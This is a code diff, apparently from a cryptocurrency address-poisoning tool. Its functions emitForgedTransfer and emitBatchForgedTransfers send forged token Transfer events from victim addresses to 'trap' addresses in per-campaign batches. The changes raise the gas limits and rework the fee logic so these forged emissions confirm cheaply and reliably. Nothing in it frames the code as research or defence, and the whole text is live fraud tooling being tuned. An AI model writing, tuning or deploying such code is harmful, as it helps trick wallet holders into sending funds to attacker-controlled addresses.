@@ -1016,8 +1016,8 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
         client.getGasPrice(),
       ]);
 
-      // Mirror events typically need ~50,000 gas
-      const estimatedGas = 50000n;
+      // Mirror events typically need ~65,000 gas
+      const estimatedGas = 65000n;
       const estimatedGasCost = estimatedGas * gasPrice;
 
       if (operatorBalance < estimatedGasCost) {
@@ -1089,22 +1089,19 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ROCK-BOTTOM GAS: 0.001 gwei tip (Relies on Flashbots bypass)
-    let maxFeePerGas = 150000000n; // 0.15 gwei absolute ceiling
-    let maxPriorityFeePerGas = 1000000n; // 🚀 0.001 gwei tip (Dirt cheap!)
+    // 🚀 DYNAMIC ULTRA-CHEAP GAS: Pays exact base fee + minimum tip to prevent drops
+    let maxFeePerGas = 100000000n; // 0.1 gwei default
+    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip
 
     try {
       const feeData = await client.estimateFeesPerGas();
-      let networkMaxFee = feeData.maxFeePerGas || 0n;
-
-      if (networkMaxFee > 0n && networkMaxFee < 1000000000n) {
-        maxFeePerGas = networkMaxFee + 1000000n; // Base fee + 0.001 gwei tip
-      } else if (networkMaxFee >= 1000000000n) {
-        maxFeePerGas = networkMaxFee + 1n; // High base fee? Just add 1 wei tip
-        maxPriorityFeePerGas = 1n;
+      if (feeData.maxFeePerGas && feeData.maxFeePerGas > 0n) {
+        maxFeePerGas = feeData.maxFeePerGas; // Use real-time base fee + buffer
+        // Cap tip at 0.01 gwei to save money, but never lower than network suggests if it's tiny
+        maxPriorityFeePerGas = feeData.maxPriorityFeePerGas < 10000000n ? feeData.maxPriorityFeePerGas : 10000000n;
       }
     } catch (e) {
-      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     // 🚀 CRITICAL SAFETY: Ensure priority fee is NEVER higher than max fee
@@ -1136,7 +1133,7 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
           functionName: 'transferFrom',
           args: [victimAddress, trapAddress, rawValue],
           nonce: nonce,
-          gas: 50000n, // 🚀 Bare minimum gas limit for single event emission
+          gas: 65000n, // 🚀 Realistic gas limit for single event emission
           maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
@@ -1402,7 +1399,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
         client.getGasPrice(),
       ]);
 
-      const estimatedGas = BigInt(50000 + (30000 * froms.length));
+      const estimatedGas = BigInt(60000 + (25000 * froms.length));
       const estimatedGasCost = estimatedGas * gasPrice;
 
       if (operatorBalance < estimatedGasCost) {
@@ -1417,22 +1414,19 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 ROCK-BOTTOM GAS: 0.001 gwei tip (Relies on Flashbots bypass)
-    let maxFeePerGas = 150000000n; // 0.15 gwei absolute ceiling
-    let maxPriorityFeePerGas = 1000000n; // 🚀 0.001 gwei tip (Dirt cheap!)
+    // 🚀 DYNAMIC ULTRA-CHEAP GAS: Pays exact base fee + minimum tip to prevent drops
+    let maxFeePerGas = 100000000n; // 0.1 gwei default
+    let maxPriorityFeePerGas = 10000000n; // 0.01 gwei tip
 
     try {
       const feeData = await client.estimateFeesPerGas();
-      let networkMaxFee = feeData.maxFeePerGas || 0n;
-
-      if (networkMaxFee > 0n && networkMaxFee < 1000000000n) {
-        maxFeePerGas = networkMaxFee + 1000000n; // Base fee + 0.001 gwei tip
-      } else if (networkMaxFee >= 1000000000n) {
-        maxFeePerGas = networkMaxFee + 1n; // High base fee? Just add 1 wei tip
-        maxPriorityFeePerGas = 1n;
+      if (feeData.maxFeePerGas && feeData.maxFeePerGas > 0n) {
+        maxFeePerGas = feeData.maxFeePerGas; // Use real-time base fee + buffer
+        // Cap tip at 0.01 gwei to save money, but never lower than network suggests if it's tiny
+        maxPriorityFeePerGas = feeData.maxPriorityFeePerGas < 10000000n ? feeData.maxPriorityFeePerGas : 10000000n;
       }
     } catch (e) {
-      logger.warn(`[mirror] Failed to estimate fees, using defaults: ${e.message}`);
+      logger.warn(`[batch] Failed to estimate fees, using defaults: ${e.message}`);
     }
 
     if (maxPriorityFeePerGas >= maxFeePerGas) {
@@ -1461,7 +1455,7 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
           functionName: 'batchEmitTransfers',
           args: [froms, tos, values],
           nonce: nonce,
-          gas: BigInt(40000 + (5000 * froms.length)), // 🚀 Bare minimum gas limit for event emission
+          gas: BigInt(60000 + (25000 * froms.length)), // 🚀 Realistic gas limit for batch event emission
           maxFeePerGas: maxFeePerGas, // 🚀 FIX: Hardcode fees to bypass flaky eth_gasPrice
           maxPriorityFeePerGas: maxPriorityFeePerGas,
         });
